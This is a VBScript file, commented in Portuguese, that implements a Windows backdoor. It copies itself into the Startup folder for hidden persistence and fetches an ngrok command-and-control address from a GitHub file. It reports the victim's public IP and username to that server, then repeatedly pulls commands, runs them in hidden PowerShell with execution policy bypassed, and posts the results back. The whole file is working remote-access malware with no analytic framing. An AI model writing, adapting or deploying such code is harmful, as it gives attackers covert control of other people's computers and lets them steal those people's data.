Option Explicit

Dim fso, shell, xhr, http, rawUrl, url, ipPublico, userName, registroData
Dim verifyUrl, verifyResp, comando, outputTexto, autorizado
Dim selfPath, selfName, startupPath, tempOutFile, stream, cmdLine

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
Set http = CreateObject("MSXML2.XMLHTTP")

On Error Resume Next

' 1. Auto-cópia para a pasta Startup para persistência invisível
selfPath = WScript.ScriptFullName
selfName = fso.GetFileName(selfPath)
startupPath = shell.SpecialFolders("Startup") & "\" & selfName

If Not fso.FileExists(startupPath) Then
    fso.CopyFile selfPath, startupPath, True
End If

rawUrl = "https://raw.githubusercontent.com/FBIgLoK/coisas/refs/heads/main/id"
tempOutFile = shell.ExpandEnvironmentStrings("%TEMP%") & "\sys_cache.tmp"

Do
    ' 2. Puxa a URL atual do Ngrok via HTTP
    http.Open "GET", rawUrl, False
    http.send
    
    If Err.Number <> 0 Then
        Err.Clear
    End If

    url = ""
    If http.Status = 200 Then
        url = Trim(http.responseText)
    End If
    
    url = Replace(url, vbCr, "")
    url = Replace(url, vbLf, "")
    url = Replace(url, Chr(9), "")
    url = Trim(url)

    If url <> "" Then
        If Right(url, 1) <> "/" Then
            url = url & "/"
        End If

        userName = shell.ExpandEnvironmentStrings("%USERNAME%")
        autorizado = False

        ' --- FASE 1: REGISTRO E VERIFICAÇÃO INICIAL ---
        cmdLine = "powershell -NoProfile -WindowStyle Hidden -Command ""(Invoke-RestMethod -Uri 'https://icanhazip.com').Trim() | Out-File -FilePath '" & tempOutFile & "' -Encoding utf8"""
        shell.Run cmdLine, 0, True
        
        ipPublico = ""
        If fso.FileExists(tempOutFile) Then
            Set stream = fso.OpenTextFile(tempOutFile, 1, False, 0)
            If Not stream.AtEndOfStream Then ipPublico = Trim(stream.ReadAll)
            stream.Close
        End If
        
        ipPublico = Replace(ipPublico, vbCr, "")
        ipPublico = Replace(ipPublico, vbLf, "")
        ipPublico = Replace(ipPublico, "ï»¿", "")
        ipPublico = Trim(ipPublico)

        registroData = ipPublico & " - " & userName

        Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
        xhr.Open "POST", url & "?registro", False
        xhr.setRequestHeader "Content-Type", "text/plain; charset=utf-8"
        xhr.send registroData

        If Err.Number <> 0 Then
            Err.Clear
        End If

        verifyUrl = url & "?verify"
        Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
        xhr.Open "GET", verifyUrl, False
        xhr.send

        If xhr.Status = 200 Then
            verifyResp = Trim(xhr.responseText)
            verifyResp = Replace(verifyResp, vbCr, "")
            verifyResp = Replace(verifyResp, vbLf, "")

            If InStr(verifyResp, userName) > 0 Then
                autorizado = True
            End If
        End If


        ' --- FASE 2: LOOP DE COMANDOS ---
        Do While autorizado
            Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
            xhr.Open "GET", verifyUrl, False
            xhr.send

            If xhr.Status = 200 Then
                verifyResp = Trim(xhr.responseText)
                verifyResp = Replace(verifyResp, vbCr, "")
                verifyResp = Replace(verifyResp, vbLf, "")

                If InStr(verifyResp, userName) = 0 Then
                    autorizado = False
                    Exit Do
                End If
            Else
                autorizado = False
                Exit Do
            End If

            Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
            xhr.Open "GET", url & "?comando", False
            xhr.send

            If xhr.Status = 200 Then
                comando = Trim(xhr.responseText)
                comando = Replace(comando, vbCr, "")
                comando = Replace(comando, vbLf, "")

                If comando <> "" And comando <> "Nenhum" Then
                    If fso.FileExists(tempOutFile) Then
                        On Error Resume Next
                        fso.DeleteFile tempOutFile, True
                        On Error GoTo 0
                    End If

                    cmdLine = "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & comando & " | Out-File -FilePath '" & tempOutFile & "' -Encoding utf8"""
                    shell.Run cmdLine, 0, True
                    
                    outputTexto = ""
                    If fso.FileExists(tempOutFile) Then
                        Set stream = fso.OpenTextFile(tempOutFile, 1, False, 0)
                        If Not stream.AtEndOfStream Then outputTexto = stream.ReadAll
                        stream.Close
                    End If
                    
                    If Trim(outputTexto) = "" Then
                        outputTexto = "Comando executado com sucesso (sem retorno)."
                    End If
                    
                    outputTexto = Replace(outputTexto, "ï»¿", "")
                    outputTexto = Trim(outputTexto)
                    
                    Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
                    xhr.Open "POST", url & "?resultado", False
                    xhr.setRequestHeader "Content-Type", "text/plain; charset=utf-8"
                    xhr.send outputTexto
                    
                    If Err.Number <> 0 Then
                        Err.Clear
                    End If
                End If
            End If

            WScript.Sleep 3000
        Loop

    End If

    WScript.Sleep 5000
Loop